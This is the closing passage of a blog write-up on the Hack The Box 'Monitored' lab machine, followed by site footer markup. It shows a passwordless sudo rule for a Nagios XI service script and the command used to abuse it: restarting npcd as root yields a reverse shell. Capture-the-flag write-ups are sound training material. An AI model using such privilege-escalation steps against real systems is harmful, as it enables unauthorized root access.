tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># so then we just run it, I know brilliant</span>
</span></span><span class=line><span class=cl>sudo /usr/local/nagiosxi/scripts/manage_services.sh *
</span></span></code></pre></div><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_142cf01cff0f58aa.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_9a11caf49819c58b.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_da428ecebfa6b8c9.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_9b0f1a1d145c2259.webp 1253w" sizes=100vw type=image/webp><img width=1253 height=109 class="mx-auto my-0 rounded-md" alt="image 28" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_bf5d0c6b2ec3272b.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_f57a8373218437e2.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_bf5d0c6b2ec3272b.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/28_hu_591cd476c2c5db2e.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/28.png 1253w" sizes=100vw></picture></figure></p><p>This shows use we can restart <code>npcd</code>!</p><p><strong>Bingo!</strong>
I just restarted it and got the reverse shell. <strong><code>Pwned!</code></strong></p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset=https://cruxqsec.github.io/writeups/htb-monitored/img/29_hu_6e1e02a4d062e19c.webp sizes=100vw type=image/webp><img width=618 height=102 class="mx-auto my-0 rounded-md" alt="image 29" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/29.png></picture></figure></p></div></section><footer class="max-w-prose pt-8 print:hidden"><div class=flex><picture class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"><img width=225 height=225 class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full" alt=cruxqsec loading=lazy decoding=async src=https://cruxqsec.github.io/profile.png></picture><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">cruxqsec</div><div class="text-sm text-neutral-700 dark:text-neutral-400">A blog about security/programming related topics.</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=https://github.com/cruxqsec target=_blank aria-label=github rel="me noopener noreferrer"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></a><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=https://app.hackthebox.com/public/users/157126 target=_blank aria-label=htb rel="me noopener noreferrer"><span class="icon relative inline-block px-1 align-text-bottom"><svg fill="currentColor" width="800" height="800" viewBox="0 0 24 24" role="img"><path d="M11.996.0a1.119 1.119.0 00-.057.003.9.9.0 00-.236.05.907.907.0 00-.165.079L1.936 5.675a.889.889.0 00-.445.77v11.111a.889.889.0 00.47.784l9.598 5.541.054.029v.002a.857.857.0 00.083.035l.012.004c.028.01.056.018.085.024.01.001.011.003.016.004a.93.93.0 00.296.015.683.683.0 00.086-.015c.01.0.011-.002.016-.004a.94.94.0 00.085-.024l.012-.004a.882.882.0 00.083-.035v-.002a1.086 1.086.0 00.054-.029l9.599-5.541a.889.889.0 00.469-.784V6.48l-.001-.026v-.008a.889.889.0 00-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899.0 00-.107-.07L12.453.127A.887.887.0 0011.99.0zm.01 2.253c.072.0.144.019.209.056l6.537 3.774a.418.418.0 010 .724l-6.537 3.774a.418.418.0 01-.418.0L5.26 6.807a.418.418.0 010-.724l6.537-3.774a.42.42.0 01.209-.056zm-8.08 6.458a.414.414.0 01.215.057l6.524 3.766a.417.417.0 01.208.361v7.533a.417.417.0 01-.626.361l-6.523-3.766a.417.417.0 01-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16.0c.215.004.41.177.41.418v7.532a.42.42.0 01-.208.362l-6.524 3.766a.417.417.0 01-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415.0 01.216-.057z"/></svg>
</span></a><a class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400" style=will-change:transform href=mailto:cruxqsec@proton.me target=_blank aria-label=email rel="me noopener noreferrer"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg></span></a></div></div></div></div><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="group flex" href=https://cruxqsec.github.io/writeups/htb-crafty/><span class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"><span class="ltr:inline rtl:hidden">&larr;</span><span class="ltr:hidden rtl:inline">&rarr;</span></span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">HTB Crafty</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2024-04-04 00:00:00 +0000 UTC">4 April 2024</time>
</span></span></a></span><span><a class="group flex text-right" href=https://cruxqsec.github.io/writeups/htb-htbank/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">HTB HTBank</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2024-06-21 00:00:00 +0000 UTC">21 June 2024</time>
</span></span><span class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"><span class="ltr:inline rtl:hidden">&rarr;</span><span class="ltr:hidden rtl:inline">&larr;</span></span></a></span></div></div></footer></article></main><div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12" id=to-top hidden=true><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div><footer class="py-10 print:hidden"><nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a href=/tags/ title=tags target=_blank><span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M48 32H197.5c17 0 33.2 6.74 45.2 18.75l176 175.95c25 25 25 65.6.0 90.6L285.3 450.7c-25 25-65.6 25-90.6.0L18.75 274.7C6.743 262.7.0 246.5.0 229.5V80C0 53.49 21.49 32 48 32zm64 144c17.7.0 32-14.3 32-32 0-17.7-14.3-32-32-32-17.67.0-32 14.3-32 32s14.33 32 32 32z"/></svg>
</span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Tags</span></a></li><li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a href=https://github.com/cruxqsec title target=_blank><span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">GitHub</span></a></li></ul></nav><div class="flex items-center justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
cruxqsec</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://github.com/jpanther/congo target=_blank rel="noopener noreferrer">Congo</a></p></div><div class="flex flex-row items-center"></div></div></footer><div id=search-wrapper class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://cruxqsec.github.io/><div id=search-modal class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex flex-none items-center justify-between px-2"><form class="flex min-w-0 flex-auto items-center"><div class="flex h-8 w-8 items-center justify-center text-neutral-400"><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto overflow-auto px-2"><ul id=search-results></ul></section></div></div></div></body></html>